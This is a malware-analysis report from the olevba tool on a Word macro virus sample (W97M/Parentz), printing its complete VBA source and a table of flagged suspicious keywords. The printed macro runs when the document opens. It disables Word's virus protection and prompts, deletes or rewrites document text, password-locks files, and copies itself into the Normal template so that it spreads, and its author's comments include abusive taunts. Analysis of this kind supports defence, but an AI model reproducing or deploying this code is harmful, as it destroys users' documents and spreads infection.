olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chameleon.b-941323a2fa582ba6165b0410a11290845b7cea7a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chameleon.b-941323a2fa582ba6165b0410a11290845b7cea7a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "MVP") <> "Enabled by Total Konfuzion" Then
        With Options
            .VirusProtection = (Rnd * 0)
            .SaveNormalPrompt = (Rnd * 0)
            .ConfirmConversions = (Rnd * 0)
            .SavePropertiesPrompt = (Rnd * 0)
        End With
        With Application
            .EnableCancelKey = wdCancelDisabled
            .Caption = "Mum.. Dad.. Fuck U !!"
            .UserAddress = "W97M/Parentz"
        End With
        If Day(Now) >= "26" Then
            With Selection.Find
                .Text = "the"
                .Replacement.Text = "Mum.. Dad.. Fuck U !!"
                .Forward = (Rnd * 0)
                .Wrap = wdFindContinue
                .Format = (Rnd * 0) + 1
                .MatchCase = (Rnd * 0)
                .MatchWholeWord = (Rnd * 0) + 1
                .MatchWildcards = (Rnd * 0)
                .MatchSoundsLike = (Rnd * 0)
                .MatchAllWordForms = (Rnd * 0)
            End With
            With ActiveDocument
                .ReadOnlyRecommended = (Rnd * 0) + 1
                .Password = "ashley"
                .WritePassword = "ashley"
            End With
        Else
            With Selection
                .HomeKey Unit:=wdStory
                .EndKey Unit:=wdStory, Extend:=wdExtend
                .Delete Unit:=wdCharacter, Count:=1
                .ParagraphFormat.Alignment = wdAlignParagraphCenter
                .Font.Name = "Arial"
                .Font.Size = 14
                .Font.Bold = (Rnd * 0) + 1
                .Font.Italic = (Rnd * 0) + 1
                .TypeText Text:="Mum.. Dad.. all u given me in the last few monthz iz shit !!.. this 1'z 4 u !!"
            End With
        End If
        If ThisDocument = ActiveDocument Then Set i = NormalTemplate Else Set i = ActiveDocument
        Vx = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        Set d = i.VBProject.VBComponents.Item(1).CodeModule
        d.DeleteLines 1, d.CountOfLines
        d.AddFromString Vx
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
' W97M/Parentz
'   by: Total Konfuzion
' Mum.. Dad.. all u given me over the last few monthz
' iz shit !!.. so I dedic8 this 1 4 u !!.. Fuck U all !!   >8)
' Don't worry.. this WILL find its way to ur work systemz !!   >8)
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

